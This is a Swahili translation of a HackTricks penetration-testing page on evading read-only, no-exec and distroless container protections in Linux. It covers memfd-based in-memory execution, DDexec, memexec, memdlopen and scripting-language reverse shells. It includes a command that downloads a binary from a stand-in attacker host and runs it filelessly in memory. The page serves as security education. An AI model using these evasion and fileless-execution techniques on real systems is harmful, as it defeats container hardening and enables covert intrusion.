# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Videos

Katika videos zifuatazo unaweza kupata mbinu zilizotajwa kwenye ukurasa huu zikielezwa kwa kina zaidi:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Inazidi kuwa kawaida kukutana na mashine za Linux zilizowekwa **read-only (ro) file system protection**, hasa kwenye containers. Hii ni kwa sababu kuendesha container yenye ro file system ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** katika `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Hata hivyo, hata kama file system ime-mountiwa kama ro, **`/dev/shm`** bado itaweza kuandikiwa, kwa hiyo si kweli kwamba hatuwezi kuandika chochote kwenye disk. Hata hivyo, folder hii ita-mountiwa ikiwa na **no-exec protection**, kwa hiyo ukidownload binary hapa **hutaweza kui-execute**.

> [!WARNING]
> Kwa mtazamo wa red team, hii hufanya iwe **ngumu kudownload na ku-execute** binaries ambazo hazipo tayari kwenye mfumo (kama backdoors au enumerators kama `kubectl`).

## Easiest bypass: Scripts

Kumbuka kwamba nilitaja binaries; unaweza **ku-execute script yoyote** mradi interpreter yake ipo ndani ya mashine, kama **shell script** ikiwa `sh` ipo au **python** **script** ikiwa `python` imewekwa.

Hata hivyo, hii pekee haitoshi ku-execute binary backdoor yako au binary tools nyingine unazoweza kuhitaji kuendesha.

## Memory Bypasses

Ikiwa unataka ku-execute binary lakini file system hairuhusu hilo, njia bora ya kufanya hivyo ni **kui-execute kutoka kwenye memory**, kwa sababu **protections hazitumiki huko**.

### FD + exec syscall bypass

Ikiwa una script engines zenye uwezo mkubwa ndani ya mashine, kama **Python**, **Perl**, au **Ruby**, unaweza kudownload binary ya ku-execute kutoka kwenye memory, kuihifadhi katika memory file descriptor (`create_memfd` syscall), ambayo haitalindwa na protections hizo, kisha kuita **`exec` syscall** ukibainisha **fd kama file ya ku-execute**.

Kwa hili unaweza kutumia kwa urahisi project ya [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kuipatia binary, nayo itazalisha script katika language iliyoonyeshwa ikiwa na **binary iliyocompressiwa na kusimbwa kwa b64**, pamoja na instructions za **kui-decode na ku-decompress** ndani ya **fd** iliyoundwa kwa kuita `create_memfd` syscall, na call ya **exec** syscall ili kuiendesha.

> [!WARNING]
> Hii haifanyi kazi katika scripting languages nyingine kama PHP au Node kwa sababu hazina **njia ya kawaida ya kuita raw syscalls** kutoka kwenye script, kwa hiyo haiwezekani kuita `create_memfd` ili kuunda **memory fd** ya kuhifadhi binary.
>
> Zaidi ya hayo, kuunda **regular fd** yenye file katika `/dev/shm` hakutafanya kazi, kwa sababu hutaruhusiwa kuiendesha kutokana na **no-exec protection** kutumika.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni technique inayokuruhusu **kubadilisha memory ya process yako mwenyewe** kwa ku-overwrite **`/proc/self/mem`**.

Kwa hiyo, kwa **kudhibiti assembly code** inayotekelezwa na process, unaweza kuandika **shellcode** na "ku-mutate" process ili **i-execute code yoyote ya kiholela**.

> [!TIP]
> **DDexec / EverythingExec** itakuruhusu kupakia na **ku-execute** **shellcode** yako mwenyewe au **binary yoyote** kutoka kwenye **memory**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Kwa maelezo zaidi kuhusu technique hii, angalia Github au:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni hatua inayofuata kwa njia ya kawaida baada ya DDexec. Ni **DDexec shellcode iliyowekwa kama daemon**, kwa hiyo kila wakati unapotaka **kuendesha binary tofauti** huhitaji kuzindua upya DDexec; unaweza tu kuendesha memexec shellcode kupitia technique ya DDexec, kisha **kuwasiliana na daemon hii ili kupitisha binaries mpya za kupakia na kuendesha**.

Unaweza kupata mfano wa jinsi ya kutumia **memexec kuendesha binaries kutoka kwenye PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Kwa madhumuni yanayofanana na DDexec, technique ya [**memdlopen**](https://github.com/arget13/memdlopen) hutoa **njia rahisi zaidi ya kupakia binaries** kwenye memory ili kuzitekeleza baadaye. Inaweza hata kuruhusu kupakia binaries zenye dependencies.

## Distroless Bypass

Kwa maelezo maalum kuhusu **distroless ni nini hasa**, inasaidia lini, haisaidii lini, na jinsi inavyobadilisha mbinu za post-exploitation kwenye containers, angalia:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless ni nini

Distroless containers huwa na **components za msingi kabisa zinazohitajika kuendesha application au service mahususi**, kama vile libraries na runtime dependencies, lakini hazina components kubwa kama package manager, shell, au system utilities.

Lengo la distroless containers ni **kupunguza attack surface ya containers kwa kuondoa components zisizohitajika** na kupunguza idadi ya vulnerabilities zinazoweza kutumiwa.

### Reverse Shell

Katika distroless container huenda **usipate hata `sh` au `bash`** ili kupata shell ya kawaida. Pia hutapata binaries kama `ls`, `whoami`, `id`... kila kitu ambacho kwa kawaida huendesha kwenye system.

> [!WARNING]
> Kwa hiyo, **hutaweza kupata** **reverse shell** au **ku-enumerate** system kama kawaida.

Hata hivyo, ikiwa container iliyo-compromise inaendesha, kwa mfano, flask web, basi python imewekwa, na kwa hiyo unaweza kupata **Python reverse shell**. Ikiwa inaendesha node, unaweza kupata Node rev shell, na hali ni hiyo hiyo kwa karibu kila **scripting language**.

> [!TIP]
> Kwa kutumia scripting language unaweza **ku-enumerate system** kwa kutumia uwezo wa language hiyo.

Ikiwa hakuna protections za **`read-only/no-exec`**, unaweza kutumia reverse shell yako vibaya ili **kuandika binaries zako kwenye file system** na **kuzitekeleza**.

> [!TIP]
> Hata hivyo, katika aina hii ya containers protections hizi kwa kawaida zitakuwepo, lakini unaweza kutumia **previous memory execution techniques kuzipita**.

Unaweza kupata **examples** za jinsi ya **kutumia baadhi ya vulnerabilities za RCE** ili kupata **reverse shells** za scripting languages na kuendesha binaries kutoka memory katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
